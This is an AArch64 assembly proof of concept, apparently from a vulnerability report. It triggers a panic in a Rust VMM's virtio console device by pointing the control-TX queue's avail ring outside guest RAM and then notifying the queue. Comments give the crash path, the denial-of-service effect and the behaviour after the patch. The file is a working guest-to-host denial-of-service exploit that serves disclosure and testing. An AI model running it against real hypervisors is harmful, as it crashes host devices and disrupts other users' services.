// Trigger finding A: queue.rs:482  self.avail_idx(..).unwrap()  in Queue::len().
// Point the control-TX queue's avail_ring outside guest RAM, then notify it.
// process_control_tx() -> Queue::pop() -> Queue::len() -> avail_idx() ->
//   GuestMemory read fails -> .unwrap() PANICS on the console worker thread.
//
// Console virtio-mmio base = 0x0a002000 (DeviceID 3). RAM at 0x80000000.
// Control TX queue index = 3. No descriptor/ring contents needed: len() reads
// avail_ring+2 and panics before any ring is interpreted, so this is minimal
// (~24 instrs, no real virtqueue memory set up — only a bogus avail address).
//
// Before patch: console EventManager thread unwinds and dies (panic=abort is
//   commented out in Cargo.toml, so it unwinds) -> console device hangs; with
//   panic=abort it would abort the whole VMM. DoS-self.
// After patch: len() logs the read error and returns 0, pop() yields None,
//   process_control_tx() is a no-op; no panic, device keeps working.
.section .text
.global _start
_start:
    ldr     x1, =0x0a002000        // console MMIO base

    // --- device status handshake: ACKNOWLEDGE|DRIVER|FEATURES_OK ---
    mov     w0, #0x1
    str     w0, [x1, #0x70]        // ACKNOWLEDGE
    mov     w0, #0x3
    str     w0, [x1, #0x70]        // | DRIVER
    mov     w0, #0xB
    str     w0, [x1, #0x70]        // | FEATURES_OK

    // --- configure control TX queue (index 3) BEFORE DRIVER_OK/activation ---
    mov     w0, #3
    str     w0, [x1, #0x30]        // QueueSel = 3 (control TX)
    mov     w0, #32
    str     w0, [x1, #0x38]        // QueueNum = 32
    // avail_ring = 0x0001_0000_0000_0000 (far outside guest RAM)
    mov     w0, #0
    str     w0, [x1, #0x90]        // QueueAvailLow  = 0
    mov     w0, #0x10000
    str     w0, [x1, #0x94]        // QueueAvailHigh = 0x10000
    mov     w0, #1
    str     w0, [x1, #0x44]        // QueueReady = 1

    // --- DRIVER_OK: activates device, hands queues (with bogus avail) over ---
    mov     w0, #0xF
    str     w0, [x1, #0x70]        // | DRIVER_OK

    // --- notify control TX queue -> wakes worker -> pop -> len().unwrap() ---
    mov     w0, #3
    str     w0, [x1, #0x50]        // QueueNotify = 3

    mov     x2, #0x4000000         // ~50 ms spin so the worker runs before SYSTEM_OFF
1:  subs    x2, x2, #1
    b.ne    1b
halt:
    ldr     x0, =0x84000008        // PSCI SYSTEM_OFF
    hvc     #0
    b       halt
